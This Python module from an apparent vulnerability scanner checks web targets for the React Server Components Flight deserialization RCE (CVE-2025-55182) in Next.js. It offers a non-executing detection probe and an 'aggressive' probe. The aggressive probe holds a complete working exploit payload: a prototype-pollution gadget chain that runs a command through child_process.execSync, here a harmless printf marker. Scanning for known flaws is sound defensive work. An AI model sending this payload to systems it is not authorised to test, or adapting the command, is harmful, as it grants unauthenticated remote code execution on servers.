from __future__ import annotations

import json
import secrets
from typing import Any

from ...core.http import HttpClient
from ...core.models import Confidence, Finding, Status

CVE_ID = "CVE-2025-55182"
NAME = "React Server Components Flight deserialization RCE (React2Shell)"
RULE = (
    "react-server-dom-webpack/parcel/turbopack 19.0.0, 19.1.0-19.1.1, 19.2.0; "
    "Next.js 15.0.x <15.0.8, 15.1.x <15.1.12, 15.2.x <15.2.9, 15.3.x <15.3.9, "
    "15.4.x <15.4.11, 15.5.x <15.5.10, 16.0.x <16.0.11, 16.1.x <16.1.5"
)
TYPE = "Remote Code Execution"
EXPLOIT_MODES = ["safe", "aggressive"]
MARKER_PREFIX = "PROOFCMS_55182_"

# Safe detection payload from the public research. It makes the vulnerable
# Flight parser resolve an invalid reference; vulnerable builds answer HTTP 500
# with an ``E{"digest"`` row. It does not execute code.
_SAFE_FIELDS = [
    ("1", "{}"),
    ("0", '["$1:aa:aa"]'),
]


def _lower_headers(response: dict[str, Any]) -> dict[str, str]:
    return {str(key).lower(): str(value) for key, value in (response.get("headers") or {}).items()}


def _multipart(fields: list[tuple[str, str]]) -> tuple[str, bytes]:
    boundary = "----ProofCMS" + secrets.token_hex(8)
    body = b""
    for name, value in fields:
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n".encode()
        body += value.encode()
        body += b"\r\n"
    body += f"--{boundary}--".encode()
    return boundary, body


def detect_rsc(target_url: str, timeout: int, proxy: str | None) -> dict[str, Any]:
    """Detect a Next.js App Router / React Server Components response."""

    client = HttpClient(base_url=target_url, timeout=timeout, proxy=proxy)
    response = client.get("/", timeout=timeout)
    headers = _lower_headers(response)
    body = str(response.get("body") or "")
    markers: list[str] = []
    if "self.__next_f" in body or "__next_f" in body:
        markers.append("next_f")
    if "/_next/static/" in body:
        markers.append("next_static")
    if any(key.startswith("x-nextjs-") for key in headers):
        markers.append("x_nextjs")
    if "next.js" in headers.get("server", "").lower() or "next.js" in headers.get("x-powered-by", "").lower():
        markers.append("server_header")
    return {
        "detected": "next_f" in markers,
        "markers": markers,
        "status": int(response.get("status") or 0),
        "server": headers.get("server"),
        "body_hash": response.get("body_hash"),
        "error": response.get("error"),
    }


def safe_probe(target_url: str, timeout: int, proxy: str | None) -> dict[str, Any]:
    """Send the non-executing Flight detection payload."""

    boundary, body = _multipart(_SAFE_FIELDS)
    client = HttpClient(base_url=target_url, timeout=timeout, proxy=proxy)
    response = client.request(
        "/",
        method="POST",
        headers={
            "Next-Action": "detect",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
        data=body,
        timeout=timeout,
        follow_redirects=False,
    )
    status = int(response.get("status") or 0)
    text = str(response.get("body") or "")
    return {
        "status": status,
        "digest_error": status == 500 and 'E{"digest"' in text,
        "body_hash": response.get("body_hash"),
        "error": response.get("error"),
    }


def aggressive_probe(target_url: str, timeout: int, proxy: str | None) -> dict[str, Any]:
    """Execute a harmless ``printf`` marker through the Flight deserializer."""

    marker = MARKER_PREFIX + secrets.token_hex(6)
    command = f"printf {marker}"
    prefix = (
        "var res=process.mainModule.require('child_process').execSync("
        + json.dumps(command)
        + ").toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        + "{digest: `NEXT_REDIRECT;push;/pwned?output=${res};307;`});"
    )
    part0 = json.dumps(
        {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": json.dumps({"then": "$B1337"}),
            "_response": {
                "_prefix": prefix,
                "_chunks": "$Q2",
                "_formData": {"get": "$1:constructor:constructor"},
            },
        },
        separators=(",", ":"),
    )
    boundary, body = _multipart([("0", part0), ("1", '"$@0"'), ("2", "[]")])
    client = HttpClient(base_url=target_url, timeout=timeout, proxy=proxy)
    response = client.request(
        "/",
        method="POST",
        headers={
            "Next-Action": "rce",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
        data=body,
        timeout=timeout,
        follow_redirects=False,
    )
    status = int(response.get("status") or 0)
    text = str(response.get("body") or "")
    redirect = _lower_headers(response).get("x-action-redirect", "")
    return {
        "marker": marker,
        "status": status,
        "redirect": redirect[:300],
        "confirmed": marker in redirect or marker in text,
        "body_hash": response.get("body_hash"),
        "error": response.get("error"),
    }


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    **kwargs: Any,
) -> Finding:
    del cms_version, kwargs
    detection = detect_rsc(target_url, timeout, proxy)
    evidence: dict[str, Any] = {"rsc": detection}
    if not detection["detected"]:
        return Finding(
            CVE_ID,
            NAME,
            Status.NOT_DETECTED,
            Confidence.LOW,
            "React Server Components / Next.js App Router",
            affected_rule=RULE,
            exploit_available=True,
            detail="No React Server Components App Router markers were observed in the root response.",
            action="Confirm the framework and React version from the build manifest or package inventory.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    if not run_exploit_check:
        return Finding(
            CVE_ID,
            NAME,
            Status.NOT_CONFIRMED,
            Confidence.MEDIUM,
            "React Server Components / Next.js App Router",
            affected_rule=RULE,
            exploit_available=True,
            detail=(
                "React Server Components App Router markers were detected, but the Flight "
                "deserialization probe was not requested."
            ),
            action="Run the safe probe against an authorized lab target; use aggressive mode only in isolation.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    if exploit_mode == "aggressive":
        proof = aggressive_probe(target_url, timeout, proxy)
        evidence.update(proof)
        if proof["confirmed"]:
            return Finding(
                CVE_ID,
                NAME,
                Status.VULNERABLE,
                Confidence.CONFIRMED,
                "React Server Components / Next.js App Router",
                affected_rule=RULE,
                exploit_available=True,
                exploit_ran=True,
                detail=(
                    "A crafted Flight payload executed a harmless printf marker through "
                    "child_process.execSync; the marker was reflected in X-Action-Redirect. "
                    "This is a full unauthenticated RCE proof."
                ),
                action="Upgrade React Server Components packages and Next.js to the fixed release immediately.",
                proof_url=target_url.rstrip("/") + "/",
                evidence=evidence,
                vulnerability_type=TYPE,
            )
        return Finding(
            CVE_ID,
            NAME,
            Status.NOT_CONFIRMED,
            Confidence.HIGH,
            "React Server Components / Next.js App Router",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            detail=(
                "The aggressive Flight payload did not return the printf marker; the parser "
                "may be patched, unreachable, or fronted by a WAF."
            ),
            action="Verify the exact React and Next.js build before treating the target as patched.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    proof = safe_probe(target_url, timeout, proxy)
    evidence.update(proof)
    if proof["digest_error"]:
        return Finding(
            CVE_ID,
            NAME,
            Status.VULNERABLE,
            Confidence.CONFIRMED,
            "React Server Components / Next.js App Router",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            detail=(
                "The safe Flight detection payload produced the vulnerable digest error "
                "(HTTP 500 with E{\"digest\"}); no command was executed."
            ),
            action="Upgrade React Server Components packages and Next.js to the fixed release immediately.",
            proof_url=target_url.rstrip("/") + "/",
            evidence=evidence,
            vulnerability_type=TYPE,
        )
    return Finding(
        CVE_ID,
        NAME,
        Status.NOT_CONFIRMED,
        Confidence.HIGH,
        "React Server Components / Next.js App Router",
        affected_rule=RULE,
        exploit_available=True,
        exploit_ran=True,
        detail=(
            "React Server Components were detected, but the safe Flight detection payload "
            "did not produce the vulnerable digest error; the target may be patched or use a "
            "different Flight parser."
        ),
        action="Verify the exact React and Next.js build; do not rely on framework version alone.",
        evidence=evidence,
        vulnerability_type=TYPE,
    )


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "generic",
        "name": NAME,
        "component": "React Server Components / Next.js App Router",
        "affected_rule": RULE,
        "affected_versions": ["19.0.0", "19.1.0-19.1.1", "19.2.0"],
        "exploit_available": True,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": True,
        "vulnerability_type": TYPE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-20",
        "updated": "2026-11-20",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2025-55182",
            "https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components",
            "https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc",
        ],
    }
